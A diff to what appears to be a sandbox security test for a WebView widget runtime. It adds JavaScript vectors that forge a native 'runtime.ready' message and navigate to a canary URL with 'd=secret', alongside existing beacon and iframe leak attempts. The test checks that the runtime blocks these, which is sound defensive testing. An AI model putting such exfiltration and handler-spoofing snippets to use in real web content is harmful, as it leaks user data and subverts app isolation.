@@ -844,6 +844,17 @@ PASSIVE_VECTORS = """
   aim("embed", function (u) { var e = document.createElement("embed"); e.src = u; add(e); });
   aim("iframe", function (u) { var f = document.createElement("iframe"); f.src = u; add(f); });
   aim("beacon", function (u) { navigator.sendBeacon(u, "secret"); });
+  // A default-world native handler would let a frame replace the live
+  // Runtime support report. The test requires the real Widget ABI below.
+  var handlers = window.webkit && window.webkit.messageHandlers;
+  if (handlers && handlers.tilecast) {
+    handlers.tilecast.postMessage({type: "runtime.ready", support: {
+      presentationSchemas: [], declarativeCapabilities: {}, widgetComponents: {}
+    }});
+  }
+  // CSP fetch directives do not contain self-navigation. The native policy
+  // must refuse it before the reachable canary receives a request.
+  setTimeout(function () { try { window.location.href = canary + "/navigation?d=secret"; } catch (err) {} }, 200);
 })(%s);
 """
 
